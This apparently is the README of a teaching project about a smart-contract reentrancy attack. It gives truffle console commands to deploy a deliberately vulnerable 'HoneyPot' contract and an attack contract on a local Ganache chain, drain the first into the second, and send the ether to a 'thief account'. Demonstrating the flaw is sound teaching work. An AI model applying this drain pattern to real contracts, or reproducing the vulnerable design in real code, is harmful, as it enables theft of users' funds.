# honeyPotReentrancyAttack
Example of vulnerable contract and an attack contract that would drain all money from vulnerable contract.


## Prerequisites
1. Make sure you have `Ganache` running on localhost:8545, if no `Ganache` installed, see https://www.trufflesuite.com/ganache to install.

## Set up
`truffle compile`

`truffle migrate`

`truffle console`



## Quick run 

HoneyPot.deployed().then(instance => honeyPotAddress = instance.address)
web3.eth.getBalance(honeyPotAddress)

web3.eth.getAccounts().then(function(acc){ accounts = acc })
accounts[1]
HoneyPot.deployed().then(instance => instance.put({from: accounts[1], value: web3.utils.toWei("10", "ether") }))
web3.eth.getBalance(honeyPotAddress)

HoneyPotCollect.deployed().then(instance => evilContractAddress = instance.address)
web3.eth.getBalance(evilContractAddress)

HoneyPotCollect.deployed().then(inst => inst.collect({ value: web3.utils.toWei("1", "ether"), gas: 1000000 }))
web3.eth.getBalance(evilContractAddress)

HoneyPotCollect.deployed().then(inst => inst.kill())

HoneyPot.deployed().then(instance => instance.put( {value: web3.utils.toWei("8", "ether")}))
HoneyPot.deployed().then(instance => instance.balances(accounts[0]))
HoneyPot.deployed().then(instance => instance.get())


## truffle console commands
Get Honey pot contract address

`HoneyPot.deployed().then(instance => honeyPotAddress = instance.address)`

Check its balance:

`web3.eth.getBalance(honeyPotAddress).toString(10)`

Send money to honey pot address from accounts[1]:

`web3.eth.getAccounts().then(function(acc){ accounts = acc }) `
`accounts[1]`

`HoneyPot.deployed().then(instance => instance.put({from: accounts[1], value: web3.utils.toWei("5", "ether") }))`

Check again honeypot contract balance:

`web3.eth.getBalance(honeyPotAddress)`

Get Attack contract address:

`HoneyPotCollect.deployed().then(instance => evilContractAddress = instance.address)`

Check its balance:

`web3.eth.getBalance(evilContractAddress)`

Attack HoneyPot contract with evil contract:

`HoneyPotCollect.deployed().then(inst => inst.collect({ value: web3.utils.toWei("5", "ether"), gas: 1000000 }))`

Transfer ether to the thief account:

`HoneyPotCollect.deployed().then(inst => inst.kill())`
